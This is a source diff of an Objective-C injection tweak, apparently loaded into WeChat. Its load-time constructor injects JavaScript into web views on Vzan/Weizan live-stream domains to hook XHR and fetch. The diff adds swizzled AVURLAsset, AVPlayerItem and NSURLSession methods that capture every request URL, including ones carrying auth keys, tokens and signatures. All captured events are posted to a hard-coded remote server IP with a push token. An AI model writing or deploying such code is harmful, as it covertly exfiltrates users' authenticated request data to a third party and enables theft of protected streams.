@@ -1,9 +1,11 @@
-// ALIWeChatWKSniffer_SafeGate.m
-// 安全门控：仅在 Vzan/微赞直播页就绪后再注入；抓到的一切事件都上报，命中流地址本地弹窗+复制。
+// ALIAllInOneSniffer.m
+// 一体化：JS 安全门控注入（仅目标域就绪后注入，抓啥都上报）+ 原生兜底（AVURLAsset/AVPlayerItem/NSURLSession）
+// 仅做被动观测；命中流地址会本地弹窗+复制，并把所有事件原样上报到你的服务器。
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
+#import <AVFoundation/AVFoundation.h>
 #import <objc/runtime.h>
 
 #pragma mark - 配置
@@ -12,28 +14,23 @@ static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-static const NSTimeInterval kScanInterval   = 1.2;   // 扫描现有 WKWebView 的间隔
+// JS 安全门控
+static const NSTimeInterval kScanInterval   = 1.2;   // 扫描 WKWebView 间隔
+static const NSTimeInterval kInjectDelay    = 0.6;   // 命中条件后延迟注入
 static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重窗口
-static const NSTimeInterval kInjectDelay    = 0.6;   // 满足条件后再延迟注入
 static const BOOL kShowPopupOnInject        = YES;   // 注入成功弹窗
 static const BOOL kShowPopupOnHit           = YES;   // 命中流地址弹窗+复制
 
-// 命中这些 host 才注入（可按需增减）
+// 目标 host（命中才注入，可按需补充）
 static NSArray<NSString*> *TargetHosts(void) {
-    return @[
-        @"ukmdg.cn",
-        @"vzuk.ukmdg.cn",
-        @"wehfws.vzuk.ukmdg.cn",
-        @"vzan.com",
-        @"weizan.com"
-    ];
+    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
 }
 
 #ifndef DEBUG_LOG
 #define DEBUG_LOG 0
 #endif
 #if DEBUG_LOG
-#define LOG(fmt, ...) NSLog((@"[ALI-WX] " fmt), ##__VA_ARGS__)
+#define LOG(fmt, ...) NSLog((@"[ALI] " fmt), ##__VA_ARGS__)
 #else
 #define LOG(...)
 #endif
@@ -44,6 +41,7 @@ static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
 
 static inline void on_main(void(^blk)(void)){
+    if (!blk) return;
     if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
 }
 
@@ -64,6 +62,7 @@ static UIWindow *keyWin(void){
 }
 
 static void popup(NSString *title, NSString *msg, NSString *copyText){
+    if (!msg) return;
     on_main(^{
         @try{
             UIWindow *w = keyWin(); if (!w) return;
@@ -118,12 +117,9 @@ static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *b
     [[[NSURLSession sharedSession] dataTaskWithRequest:req
                                      completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
         NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
-        if (e || sc < 200 || sc >= 300) {
-            _ali_post_chain(paths, idx + 1, body);
-        }
+        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx + 1, body);
     }] resume];
 }
-
 static void postText(NSString *text){
     if (!text) return;
     _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
@@ -135,10 +131,11 @@ static NSString *jsonStringify(NSDictionary *obj){
     return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
 }
 
+#pragma mark - 统一事件处理
+
 static void handleRawEvent(NSDictionary *evt){
     NSString *js = jsonStringify(evt);
     if (js) postText(js);
-
     NSString *u = evt[@"url"];
     if (u && looksLikeStream(u) && !dedupe_skip(u)) {
         if (kShowPopupOnHit){
@@ -148,8 +145,21 @@ static void handleRawEvent(NSDictionary *evt){
         }
     }
 }
+static void handleCapturedURL(NSString *url, NSString *from){
+    if (!url) return;
+    if (dedupe_skip(url)) return;
+    if (kShowPopupOnHit && looksLikeStream(url)){
+        UIPasteboard.generalPasteboard.string = url;
+        popup(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
+    }
+    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
+                          @"from": from?:@"native",
+                          @"url": url?:@"",
+                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
+    NSString *s = jsonStringify(evt); if (s) postText(s);
+}
 
-#pragma mark - 注入的 JS（抓啥都上报）
+#pragma mark - JS 注入部分（安全门控）
 
 static NSString *inpageJS(void){
     return @
@@ -157,9 +167,9 @@ static NSString *inpageJS(void){
       "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
         "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{console.log('[ALI_SNIF]',p);window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
       "function looks(u){if(!u)return false;u=(u+'').toLowerCase();"
-        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
-        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
-        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;return false;}"
+        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1)return true;"
+        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
+        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1)return true;return false;}"
       "send('INJECT_OK',{});"
       // XHR
       "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
@@ -196,8 +206,7 @@ static NSString *inpageJS(void){
     "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
 }
 
-#pragma mark - JS Bridge
-
+// JS bridge
 @interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
 @end
 @implementation ALIMessageHandler
@@ -207,10 +216,7 @@ static NSString *inpageJS(void){
     handleRawEvent((NSDictionary *)message.body);
 }
 @end
-
 static ALIMessageHandler *g_handler;
-
-#pragma mark - 仅命中目标域名 & ready 时注入
 
 static const void *kInjectedKey = &kInjectedKey;
 static const void *kKVOKey      = &kKVOKey;
@@ -226,8 +232,7 @@ static BOOL hostMatches(NSURL *url){
 
 static void try_inject_when_ready(WKWebView *wv){
     if (!wv) return;
-    double prog = wv.estimatedProgress;
-    if (prog < 0.8) return;
+    if (wv.estimatedProgress < 0.8) return;
 
     [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
         if (err) return;
@@ -249,10 +254,13 @@ static void try_inject_when_ready(WKWebView *wv){
             NSString *js = inpageJS();
             [wv evaluateJavaScript:js completionHandler:nil];
 
+            // PING 一下确认桥可用
+            NSString *ping = @"(function(){try{ if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){ window.webkit.messageHandlers.__ALI_SNIF__.postMessage({type:'PING_FROM_NATIVE', page:location.href, ts:Date.now()}); } }catch(e){} })();";
+            [wv evaluateJavaScript:ping completionHandler:nil];
+
             if (kShowPopupOnInject){
                 popup(@"JS 注入成功", [NSString stringWithFormat:@"域名：%@\n页面已就绪，开始采集", u.host ?: @"(null)"], nil);
             }
-
             NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                   @"app": @"WeChat",
                                   @"page": (wv.URL.absoluteString ?: @""),
@@ -261,8 +269,6 @@ static void try_inject_when_ready(WKWebView *wv){
         });
     }];
 }
-
-#pragma mark - KVO(URL/estimatedProgress)
 
 @interface _ALIKVOBox : NSObject
 @property (nonatomic, weak) WKWebView *wv;
@@ -276,7 +282,7 @@ static void try_inject_when_ready(WKWebView *wv){
 }
 - (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
     WKWebView *wv = (WKWebView *)object;
-    if (![wv isKindOfClass:WKWebView.class]) return;
+    if (![wv isKindOfClass:[WKWebView class]]) return;
     if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
         NSURL *u = wv.URL;
         if (hostMatches(u)) {
@@ -298,17 +304,13 @@ static void attach_kvo_if_needed(WKWebView *wv){
     }@catch(__unused NSException *e){}
 }
 
-#pragma mark - 扫描现有 WKWebView（无 swizzle、无 documentStart）
-
 static void walk_view(UIView *v){
     if (!v) return;
     Class WK = NSClassFromString(@"WKWebView");
     if (WK && [v isKindOfClass:WK]){
         WKWebView *wv = (WKWebView *)v;
         attach_kvo_if_needed(wv);
-        if (hostMatches(wv.URL)) {
-            try_inject_when_ready(wv);
-        }
+        if (hostMatches(wv.URL)) try_inject_when_ready(wv);
     }
     for (UIView *sub in v.subviews) walk_view(sub);
 }
@@ -322,11 +324,84 @@ static void scan_loop(void){
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval * NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
-#pragma mark - 入口
+#pragma mark - 原生兜底（AV/NSURLSession）
+
+// AVURLAsset: -initWithURL:options:
+static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL *, NSDictionary *);
+static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
+    @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset"); }); }@catch(__unused NSException *e){}
+    return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
+}
+// AVPlayerItem: -initWithURL:
+static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL *);
+static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
+    @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem"); }); }@catch(__unused NSException *e){}
+    return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
+}
+// NSURLSession: -dataTaskWithRequest:
+static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest *);
+static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
+    @try{ NSURL *u = req.URL; if (u.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(u.absoluteString, @"NSURLSession(Request)"); }); }@catch(__unused NSException *e){}
+    return orig_NSURLSession_dataTaskWithRequest(self, _cmd, req);
+}
+// NSURLSession: -dataTaskWithURL:
+static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithURL)(id, SEL, NSURL *);
+static NSURLSessionTask* replaced_NSURLSession_dataTaskWithURL(id self, SEL _cmd, NSURL *url){
+    @try{ if (url.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(url.absoluteString, @"NSURLSession(URL)"); }); }@catch(__unused NSException *e){}
+    return orig_NSURLSession_dataTaskWithURL(self, _cmd, url);
+}
+
+static void swizzle_instance_method(Class cls, SEL sel, IMP newImp, const char *types){
+    Method m = class_getInstanceMethod(cls, sel);
+    if (!m){ class_addMethod(cls, sel, newImp, types); return; }
+    method_setImplementation(m, newImp);
+}
+
+#pragma mark - 入口：两套机制一起启动
 
 __attribute__((constructor))
-static void ALIWeChatWKSnifferSafeGateInit(void){
-    if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.safe", DISPATCH_QUEUE_SERIAL);
+static void ALIAllInOneSnifferInit(void){
+    if (!gq)    gq    = dispatch_queue_create("com.ali.allinone", DISPATCH_QUEUE_SERIAL);
     if (!g_seen)g_seen= [NSMutableDictionary dictionary];
-    scan_loop(); // 仅启动扫描+KVO；真正注入在命中域名且页面就绪时
+
+    // 1) JS 安全门控扫描
+    scan_loop();
+
+    // 2) 原生兜底 swizzle
+    @try{
+        // AVURLAsset
+        Class cAVURLAsset = NSClassFromString(@"AVURLAsset");
+        if (cAVURLAsset){
+            SEL sel1 = @selector(initWithURL:options:);
+            Method m1 = class_getInstanceMethod(cAVURLAsset, sel1);
+            if (m1){ orig_AVURLAsset_initWithURL_options = (void*)method_getImplementation(m1);
+                swizzle_instance_method(cAVURLAsset, sel1, (IMP)replaced_AVURLAsset_initWithURL_options, method_getTypeEncoding(m1)); }
+        }
+        // AVPlayerItem
+        Class cAVPlayerItem = NSClassFromString(@"AVPlayerItem");
+        if (cAVPlayerItem){
+            SEL sel2 = @selector(initWithURL:);
+            Method m2 = class_getInstanceMethod(cAVPlayerItem, sel2);
+            if (m2){ orig_AVPlayerItem_initWithURL = (void*)method_getImplementation(m2);
+                swizzle_instance_method(cAVPlayerItem, sel2, (IMP)replaced_AVPlayerItem_initWithURL, method_getTypeEncoding(m2)); }
+        }
+        // NSURLSession
+        Class cNSURLSession = NSClassFromString(@"NSURLSession");
+        if (cNSURLSession){
+            SEL sel3 = @selector(dataTaskWithRequest:);
+            Method m3 = class_getInstanceMethod(cNSURLSession, sel3);
+            if (m3){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m3);
+                swizzle_instance_method(cNSURLSession, sel3, (IMP)replaced_NSURLSession_dataTaskWithRequest, method_getTypeEncoding(m3)); }
+            SEL sel4 = @selector(dataTaskWithURL:);
+            Method m4 = class_getInstanceMethod(cNSURLSession, sel4);
+            if (m4){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m4);
+                swizzle_instance_method(cNSURLSession, sel4, (IMP)replaced_NSURLSession_dataTaskWithURL, method_getTypeEncoding(m4)); }
+        }
+
+        // 上报准备就绪
+        NSDictionary *evt = @{@"type": @"NATIVE_HOOKS_READY",
+                              @"app": @"WeChat",
+                              @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
+        NSString *s = jsonStringify(evt); if (s) postText(s);
+    }@catch(__unused NSException *e){}
 }
